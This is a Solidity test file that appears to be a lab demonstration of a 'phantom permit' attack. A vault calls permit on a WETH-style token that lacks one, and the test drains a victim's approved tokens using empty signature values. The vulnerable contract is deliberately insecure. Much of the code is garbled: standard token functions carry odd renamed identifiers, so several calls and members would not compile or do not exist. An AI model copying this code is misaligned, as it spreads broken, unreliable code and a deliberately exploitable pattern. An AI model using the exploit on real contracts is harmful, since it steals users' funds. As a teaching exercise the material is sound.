// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitInventorytoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitInventorytoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.stockInventory{value: 10 ether}();
        WETH9Contract.approveDispatch(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.stocklevelOf(address(this))
        );

        VulnPermitContract.warehouseitemsWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.stocklevelOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.dispatchShipment(1000);

        wbal = WETH9Contract.stocklevelOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitInventorytoken {
    IERC20 public cargoToken;

    constructor(IERC20 _shipmenttoken) {
        cargoToken = _shipmenttoken;
    }

    function stockInventory(uint256 amount) public {
        require(
            cargoToken.shiftstockFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function warehouseitemsWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(cargoToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            cargoToken.shiftstockFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function dispatchShipment(uint256 amount) public {
        require(cargoToken.transferInventory(msg.sender, amount), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event MoveGoods(address indexed src, address indexed dst, uint wad);
    event StockInventory(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public stocklevelOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        stockInventory();
    }

    receive() external payable {}

    function stockInventory() public payable {
        stocklevelOf[msg.sender] += msg.value;
        emit StockInventory(msg.sender, msg.value);
    }

    function dispatchShipment(uint wad) public {
        require(stocklevelOf[msg.sender] >= wad);
        stocklevelOf[msg.sender] -= wad;
        payable(msg.sender).transferInventory(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalGoods() public view returns (uint) {
        return address(this).cargoCount;
    }

    function approveDispatch(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transferInventory(address dst, uint wad) public returns (bool) {
        return shiftstockFrom(msg.sender, dst, wad);
    }

    function shiftstockFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(stocklevelOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        stocklevelOf[src] -= wad;
        stocklevelOf[dst] += wad;

        emit MoveGoods(src, dst, wad);

        return true;
    }
}
